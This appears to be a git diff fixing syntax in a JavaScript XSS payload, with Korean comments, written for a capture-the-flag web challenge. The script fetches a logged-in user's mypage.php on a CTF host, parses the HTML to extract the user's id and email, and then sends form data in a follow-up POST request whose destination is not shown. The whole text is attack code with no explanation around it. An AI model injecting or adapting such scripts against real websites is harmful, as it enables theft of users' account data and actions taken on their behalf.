@@ -1,7 +1,7 @@
 <script>
     fetch('http://ctf.segfaulthub.com:4498/mypage.php') //mypage.php에 접근하여 id, email 값 추출
         .then(response => response.text())
-        //.then(html => {
+        .then(html => {
         let parser = new DOMParser();
         let doc = parser.parseFromString(html, 'text/html');
         let id1 = doc.getElementsByTagName('td')[2].textContent; //id 값 추출
@@ -16,8 +16,7 @@
         headers: {
         'Content-Type': 'application/x-www-form-urlencoded'
         },
-        body: formData.toString()
-        })
+        body: formData.toString()})
             .then(response => response.text())
             .then(html => {
             let parser = new DOMParser();
